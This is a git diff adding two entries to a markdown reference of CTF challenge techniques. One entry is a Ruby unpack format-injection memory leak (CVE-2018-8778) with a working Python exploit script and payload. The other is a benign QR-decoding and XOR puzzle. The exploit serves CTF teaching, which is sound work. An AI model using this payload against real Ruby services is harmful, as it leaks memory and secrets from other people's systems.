@@ -14,6 +14,8 @@
 - [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
 - [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
 - [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)
+- [Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-arrayunpack-buffer-under-read-cve-2018-8778-codegate-2019)
+- [Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)](#binary-grid-text-to-qr-image--xor-key-pragyan-ctf-2019)
 
 ---
 
@@ -427,3 +429,76 @@ print(''.join(chars))
 ```
 
 **Key insight:** Known plaintext at the start and end (flag format like `CTF{` and `}`) reveals the encoding alphabet — map the known characters back to their note pairs to confirm the scale-degree assignment. Musical scale degree = nibble value; pairs of notes = one byte.
+
+---
+
+## Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)
+
+**Pattern:** A Ruby service calls `String#unpack` (or `Array#pack`) with an attacker-controlled format string. On pre-2.5.1 Ruby, oversized `@N` offsets are compared with signed integers, so a huge N wraps to a negative pointer offset — `unpack` then reads bytes from memory *before* the string's buffer and emits them as integers. Combined with the common bug of putting user input inside the format (e.g. `input.unpack("C*#{input}.length")`), you get an arbitrary memory dump primitive.
+
+```python
+# Remote Ruby server evaluates: input.unpack("C*#{input}.length")
+# Supplying "@HUGECHUNK1200000" as input builds format "C*@HUGECHUNK1200000.length"
+# which unpack parses as: @<offset> C<count> -> read <count> bytes from far offset.
+import socket
+payload = b'@18446744073708351616C1200000\n1\n'   # 2**64 - 0x1C0000
+s = socket.create_connection(('target', 12137))
+s.sendall(payload)
+data = b''
+while True:
+    chunk = s.recv(4096)
+    if not chunk:
+        break
+    data += chunk
+
+# Each emitted line is one int (byte value from leaked memory)
+import string
+out = ''.join(
+    chr(int(line)) for line in data.decode(errors='ignore').splitlines()
+    if line.strip().isdigit() and chr(int(line)) in string.printable
+)
+import re
+print(re.findall(r'FLAG\{[^}]*\}', out))
+```
+
+**Key insight:** `String#unpack` is not inherently unsafe — it becomes catastrophic when (a) the format string is attacker-controlled (format-injection pattern, equivalent to `printf` bugs), and (b) the Ruby runtime is pre-2.5.1 (CVE-2018-8778). Huge `@N` offsets leak arbitrary memory. Always audit Ruby services that interpolate user input into `pack`/`unpack`/`sprintf` templates.
+
+**References:** Codegate CTF 2019 Preliminary — mini converter, writeup 13209
+
+---
+
+## Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)
+
+**Pattern:** A text file contains only `0` and `1` characters (often one per line or with random line breaks). Strip whitespace, verify the length is a perfect square (or a known W*H), render as a pixel grid, and decode with `pyzbar`. The QR payload is hex-encoded and must be XORed with a repeating key (commonly `flag` or the challenge name) to reveal the flag.
+
+```python
+from PIL import Image, ImageDraw
+from pyzbar.pyzbar import decode
+
+raw = open('01qr').read()
+bits = ''.join(c for c in raw if c in '01')
+# Guess dimensions
+import math
+n = int(math.isqrt(len(bits)))
+assert n * n == len(bits), f'not square: {len(bits)}'
+
+scale = 5
+img = Image.new('RGB', (n * scale, n * scale), (255, 255, 255))
+d = ImageDraw.Draw(img)
+for i in range(n):
+    for j in range(n):
+        if bits[i * n + j] == '0':           # 0 == black in this challenge
+            d.rectangle((j*scale, i*scale,
+                         j*scale + scale, i*scale + scale), fill=(0, 0, 0))
+img.save('qr.png')
+
+hexstr = decode(img)[0].data.decode()
+ct = bytes.fromhex(hexstr)
+key = b'flag'
+pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
+print(pt)
+```
+
+**Key insight:** Binary-grid text files are often "render me" puzzles — one pixel per bit, scale by 4-8x so `zbarimg`/`pyzbar` can find the finder patterns. If the decoded bytes are printable-ish but nonsense (e.g. `9YQ8S_VY^`), try short repeating-key XOR with the word `flag`, the CTF name, or `ctf{` — XORing the first 5 bytes of ciphertext with `pctf{` recovers the key immediately.
+
+**References:** Pragyan CTF 2019 — EXORcism, writeup 13835
